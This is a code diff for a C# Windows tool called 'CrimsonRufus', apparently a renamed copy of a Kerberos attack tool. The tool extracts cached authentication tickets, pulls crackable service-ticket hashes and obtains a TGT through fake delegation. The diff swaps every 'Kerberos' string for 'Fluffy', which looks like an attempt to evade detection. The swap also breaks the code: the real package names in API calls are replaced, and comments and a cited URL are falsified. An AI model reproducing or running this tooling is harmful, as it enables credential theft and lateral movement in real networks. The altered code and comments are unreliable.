@@ -10,8 +10,8 @@ using Microsoft.Win32;
 using ConsoleTables;
 using System.Security.Principal;
 using CrimsonRufus.lib.Interop;
-using CrimsonRufus.Kerberos;
-using CrimsonRufus.Kerberos.PAC;
+using CrimsonRufus.Fluffy;
+using CrimsonRufus.Fluffy.PAC;
 using System.Linq;
 
 namespace CrimsonRufus {
@@ -32,7 +32,7 @@ namespace CrimsonRufus {
             KERB_RETRIEVE_TICKET_DONT_USE_CACHE = 1,    // Always request a new ticket; do not search the cache.
             KERB_RETRIEVE_TICKET_USE_CACHE_ONLY = 2,    // Return only a previously cached ticket.
             KERB_RETRIEVE_TICKET_USE_CREDHANDLE = 4,    // Use the CredentialsHandle member instead of LogonId to identify the logon session. This option is not available for 32-bit Windows-based applications running on 64-bit Windows.
-            KERB_RETRIEVE_TICKET_AS_KERB_CRED = 8,      // Return the ticket as a Kerberos credential.The Kerberos ticket is defined in Internet RFC 4120 as KRB_CRED.For more information, see http://www.ietf.org.
+            KERB_RETRIEVE_TICKET_AS_KERB_CRED = 8,      // Return the ticket as a Fluffy credential.The Fluffy ticket is defined in Internet RFC 4120 as KRB_CRED.For more information, see http://www.ietf.org.
             KERB_RETRIEVE_TICKET_WITH_SEC_CRED = 10,    // Not implemented
             KERB_RETRIEVE_TICKET_CACHE_TICKET = 20,     // Return the ticket that is currently in the cache. If the ticket is not in the cache, it is requested and then cached. This flag should not be used with the KERB_RETRIEVE_TICKET_DONT_USE_CACHE flag.
             KERB_RETRIEVE_TICKET_MAX_LIFETIME = 40,     //Return a fresh ticket with maximum allowed time by the policy. The ticker is cached afterwards. Use of this flag implies that KERB_RETRIEVE_TICKET_USE_CACHE_ONLY is not set and KERB_RETRIEVE_TICKET_CACHE_TICKET is set
@@ -189,7 +189,7 @@ namespace CrimsonRufus {
 
         public static List<SESSION_CRED> EnumerateTickets(bool extractTicketData = false, LUID targetLuid = new LUID(), string targetService = null, string targetUser = null, string targetServer = null, bool includeComputerAccounts = true, bool silent = false)
         {
-            //  Enumerates Kerberos tickets with various targeting options
+            //  Enumerates Fluffy tickets with various targeting options
 
             //  targetLuid              -   the target logon ID (LUID) to extract tickets for. Requires elevation.
             //  targetService           -   the target service name to extract tickets for (use "krbtgt" for TGTs)
@@ -201,16 +201,16 @@ namespace CrimsonRufus {
             //  For elevated enumeration, the code first elevates to SYSTEM and uses LsaRegisterLogonProcessHelper() connect to LSA
             //      then calls LsaCallAuthenticationPackage w/ a KerbQueryTicketCacheMessage message type to enumerate all cached tickets
             //      and finally uses LsaCallAuthenticationPackage w/ a KerbRetrieveEncodedTicketMessage message type
-            //      to extract the Kerberos ticket data in .kirbi format (service tickets and TGTs)
+            //      to extract the Fluffy ticket data in .kirbi format (service tickets and TGTs)
 
             //  For non-elevated enumeration, the code first uses LsaConnectUntrusted() to connect and LsaCallAuthenticationPackage w/ a KerbQueryTicketCacheMessage message type
             //      to enumerate all cached tickets, then uses LsaCallAuthenticationPackage w/ a KerbRetrieveEncodedTicketMessage message type
-            //      to extract the Kerberos ticket data in .kirbi format (service tickets and TGTs)
+            //      to extract the Fluffy ticket data in .kirbi format (service tickets and TGTs)
 
             // adapted partially from Vincent LE TOUX' work
             //      https://github.com/vletoux/MakeMeEnterpriseAdmin/blob/master/MakeMeEnterpriseAdmin.ps1#L2939-L2950
             // and https://www.dreamincode.net/forums/topic/135033-increment-memory-pointer-issue/
-            // also Jared Atkinson's work at https://github.com/Invoke-IR/ACE/blob/master/ACE-Management/PS-ACE/Scripts/ACE_Get-KerberosTicketCache.ps1
+            // also Jared Atkinson's work at https://github.com/Invoke-IR/ACE/blob/master/ACE-Management/PS-ACE/Scripts/ACE_Get-FluffyTicketCache.ps1
 
 
             // sanity checks
@@ -245,7 +245,7 @@ namespace CrimsonRufus {
 
             int retCode;
             int authPack;
-            var name = "kerberos";
+            var name = "fluffy";
             var sessionCreds = new List<SESSION_CRED>();
 
             Interop.LSA_STRING_IN LSAString;
@@ -257,7 +257,7 @@ namespace CrimsonRufus {
 
             try
             {
-                // obtains the unique identifier for the kerberos authentication package.
+                // obtains the unique identifier for the fluffy authentication package.
                 retCode = Interop.LsaLookupAuthenticationPackage(lsaHandle, ref LSAString, out authPack);
 
                 // STEP 1 - enumerate all current longon session IDs (LUID)
@@ -428,7 +428,7 @@ namespace CrimsonRufus {
             //  displayFormat           -   the TicketDisplayFormat to display the tickets in ("Triage" table, traditional "Klist", or "Full" for full ticket extraction)
             //  displayTGT              -   shortened display for monitor/harvesting
             //  displayB64ticket        -   display a base64 encoded version of the ticket
-            //  extractKerberoastHash   -   extract out the rc4_hmac "kerberoastable" hash, if possible
+            //  extractFluffyroastHash   -   extract out the rc4_hmac "fluffyroastable" hash, if possible
 
             // used for table output
             var table = new ConsoleTable("LUID", "UserName", "Service", "EndTime");
@@ -488,7 +488,7 @@ namespace CrimsonRufus {
             }
         }
 
-        public static void DisplayTicket(KRB_CRED cred, int indentLevel = 2, bool displayTGT = false, bool displayB64ticket = false, bool extractKerberoastHash = true, bool nowrap = false, byte[] serviceKey = null, byte[] asrepKey = null, string serviceUser = "", string serviceDomain = "", byte[] krbKey = null, byte[] keyList = null, string desPlainText = "", PA_DMSA_KEY_PACKAGE dmsaCurrentKeys = null)
+        public static void DisplayTicket(KRB_CRED cred, int indentLevel = 2, bool displayTGT = false, bool displayB64ticket = false, bool extractFluffyroastHash = true, bool nowrap = false, byte[] serviceKey = null, byte[] asrepKey = null, string serviceUser = "", string serviceDomain = "", byte[] krbKey = null, byte[] keyList = null, string desPlainText = "", PA_DMSA_KEY_PACKAGE dmsaCurrentKeys = null)
         {
             // displays a given .kirbi (KRB_CRED) object, with display options
 
@@ -496,7 +496,7 @@ namespace CrimsonRufus {
             //  indentLevel             -   level of indent, default of 2
             //  displayTGT              -   shortened display for monitor/harvesting
             //  displayB64ticket        -   display a base64 encoded version of the ticket
-            //  extractKerberoastHash   -   extract out the rc4_hmac "kerberoastable" hash, if possible
+            //  extractFluffyroastHash   -   extract out the rc4_hmac "fluffyroastable" hash, if possible
             //  nowrap                  -   don't wrap base64 ticket output
 
             var userName = string.Join("@", cred.enc_part.ticket_info[0].pname.name_string.ToArray());
@@ -592,9 +592,9 @@ namespace CrimsonRufus {
                     }
                 }
 
-                else if (extractKerberoastHash && (serviceName != "krbtgt"))
+                else if (extractFluffyroastHash && (serviceName != "krbtgt"))
                 {
-                    // if this isn't a TGT, try to display a Kerberoastable hash
+                    // if this isn't a TGT, try to display a Fluffyroastable hash
                     if (!eType.Equals(Interop.KERB_ETYPE.rc4_hmac) && !eType.Equals(Interop.KERB_ETYPE.aes256_cts_hmac_sha1) && !eType.Equals(Interop.KERB_ETYPE.des_cbc_md5))
                     {
                         // can only display rc4_hmac as it doesn't have a salt. DES/AES keys require the user/domain as a salt,
@@ -1050,7 +1050,7 @@ namespace CrimsonRufus {
             try
             {
                 Interop.LSA_STRING_IN LSAString;
-                var Name = "kerberos";
+                var Name = "fluffy";
                 LSAString.Length = (ushort)Name.Length;
                 LSAString.MaximumLength = (ushort)(Name.Length + 1);
                 LSAString.Buffer = Name;
@@ -1130,7 +1130,7 @@ namespace CrimsonRufus {
             try
             {
                 Interop.LSA_STRING_IN LSAString;
-                var Name = "kerberos";
+                var Name = "fluffy";
                 LSAString.Length = (ushort)Name.Length;
                 LSAString.MaximumLength = (ushort)(Name.Length + 1);
                 LSAString.Buffer = Name;
@@ -1194,7 +1194,7 @@ namespace CrimsonRufus {
             int authPack;
             IntPtr lsaHandle;
             int retCode;
-            var name = "kerberos";
+            var name = "fluffy";
             byte[] returnedSessionKey;
             Interop.LSA_STRING_IN LSAString;
             LSAString.Length = (ushort)name.Length;
@@ -1304,8 +1304,8 @@ namespace CrimsonRufus {
             var ptsExpiry = new Interop.SECURITY_INTEGER();
             var SECPKG_CRED_OUTBOUND = 2;
 
-            // first get a handle to the Kerberos package
-            var status = Interop.AcquireCredentialsHandle(null, "Kerberos", SECPKG_CRED_OUTBOUND, IntPtr.Zero, IntPtr.Zero, 0, IntPtr.Zero, ref phCredential, ref ptsExpiry);
+            // first get a handle to the Fluffy package
+            var status = Interop.AcquireCredentialsHandle(null, "Fluffy", SECPKG_CRED_OUTBOUND, IntPtr.Zero, IntPtr.Zero, 0, IntPtr.Zero, ref phCredential, ref ptsExpiry);
 
             if (status == 0)
             {
@@ -1319,7 +1319,7 @@ namespace CrimsonRufus {
 
                 if (display)
                 {
-                    Console.WriteLine("[*] Initializing Kerberos GSS-API w/ fake delegation for target '{0}'", targetSPN);
+                    Console.WriteLine("[*] Initializing Fluffy GSS-API w/ fake delegation for target '{0}'", targetSPN);
                 }
 
                 // now initialize the fake delegate ticket for the specified targetname (default cifs/DC.domain.com)
@@ -1340,7 +1340,7 @@ namespace CrimsonRufus {
                 {
                     if (display)
                     {
-                        Console.WriteLine("[+] Kerberos GSS-API initialization success!");
+                        Console.WriteLine("[+] Fluffy GSS-API initialization success!");
                     }
 
                     if ((ClientContextAttributes & (uint)Interop.ISC_REQ.DELEGATE) == 1)
@@ -1352,7 +1352,7 @@ namespace CrimsonRufus {
 
                         // the fake delegate AP-REQ ticket is now in the cache!
 
-                        // the Kerberos OID to search for in the output stream
+                        // the Fluffy OID to search for in the output stream
                         //  from Kekeo -> https://github.com/gentilkiwi/kekeo/blob/master/kekeo/modules/kuhl_m_tgt.c#L329-L345
                         byte[] KeberosV5 = { 0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x12, 0x01, 0x02, 0x02 }; // 1.2.840.113554.1.2.2
                         var ClientTokenArray = ClientToken.GetSecBufferByteArray();
@@ -1401,7 +1401,7 @@ namespace CrimsonRufus {
                                             }
 
                                             // KRB_KEY_USAGE_AP_REQ_AUTHENTICATOR = 11
-                                            var rawBytes = Crypto.KerberosDecrypt(authenticatorEtype, Interop.KRB_KEY_USAGE_AP_REQ_AUTHENTICATOR, key, encAuthenticator.cipher);
+                                            var rawBytes = Crypto.FluffyDecrypt(authenticatorEtype, Interop.KRB_KEY_USAGE_AP_REQ_AUTHENTICATOR, key, encAuthenticator.cipher);
 
                                             var asnAuthenticator = AsnElt.Decode(rawBytes, false);
 
@@ -1446,7 +1446,7 @@ namespace CrimsonRufus {
                                                                     var enc_part = elt3.Sub[0].Sub[1].GetOctetString();
 
                                                                     // KRB_KEY_USAGE_KRB_CRED_ENCRYPTED_PART = 14
-                                                                    var rawBytes2 = Crypto.KerberosDecrypt(authenticatorEtype, Interop.KRB_KEY_USAGE_KRB_CRED_ENCRYPTED_PART, key, enc_part);
+                                                                    var rawBytes2 = Crypto.FluffyDecrypt(authenticatorEtype, Interop.KRB_KEY_USAGE_KRB_CRED_ENCRYPTED_PART, key, enc_part);
 
                                                                     // decode the decrypted plaintext enc par and add it to our final cred object
                                                                     var encKrbCredPartAsn = AsnElt.Decode(rawBytes2, false);
@@ -1494,12 +1494,12 @@ namespace CrimsonRufus {
                             }
                             else
                             {
-                                Console.WriteLine("[X] Error: Kerberos OID not found in output buffer!");
+                                Console.WriteLine("[X] Error: Fluffy OID not found in output buffer!");
                             }
                         }
                         else
                         {
-                            Console.WriteLine("[X] Error: Kerberos OID not found in output buffer!");
+                            Console.WriteLine("[X] Error: Fluffy OID not found in output buffer!");
                         }
                     }
                     else
